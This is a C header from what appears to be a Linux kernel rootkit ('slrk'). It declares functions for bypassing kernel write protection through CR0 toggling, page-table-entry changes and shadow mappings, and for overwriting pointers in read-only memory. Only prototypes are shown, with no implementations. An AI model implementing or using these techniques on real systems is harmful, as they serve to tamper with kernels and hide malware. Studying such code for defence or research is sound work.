#ifndef ROOTKIT_MEMORY_H
# define ROOTKIT_MEMORY_H

# include <linux/types.h>
# include <asm/cacheflush.h>

enum slrk_mem {
    MEM_CR0     = 1,
    MEM_PTE     = 2,
    MEM_VMAP    = 3
};

void slrk_mem_method(enum slrk_mem m);
void slrk_write_read_only(void *dst, void *src, size_t n);
void slrk_write_ptr_read_only(void *addr, void *ptr);

int *pte_set_rw(void *addr, size_t len);
void pte_restore(void *addr, size_t len, int *saved_pte);

void disable_write_protect(void);
void enable_write_protect(void);

void *shadow_mapping(void *addr, size_t len);
void del_shadow_mapping(void *addr);


#endif /* !ROOTKIT_MEMORY_H */
